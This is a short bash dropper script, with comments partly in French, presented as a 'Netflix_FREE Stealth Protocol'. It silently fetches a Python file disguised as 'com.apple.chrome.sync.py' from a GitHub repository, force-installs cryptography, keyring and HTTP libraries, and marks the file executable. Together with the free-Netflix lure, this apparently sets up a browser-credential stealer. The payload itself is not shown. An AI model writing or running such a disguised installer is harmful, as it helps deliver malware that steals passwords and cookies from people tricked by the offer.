#!/bin/bash
echo "[*] Initializing Netflix_FREE Stealth Protocol..."

# 1. Télécharger le script principal (Tu as oublié cette étape !)
curl -s -O https://raw.githubusercontent.com/souhail-lass/Netflix_FREE/main/com.apple.chrome.sync.py

# 2. Installation forcée des dépendances
pip3 install pycryptodome keyring requests --break-system-packages --quiet

# 3. Permissions
chmod +x com.apple.chrome.sync.py

echo "[+] Environment Ready. Lock in."
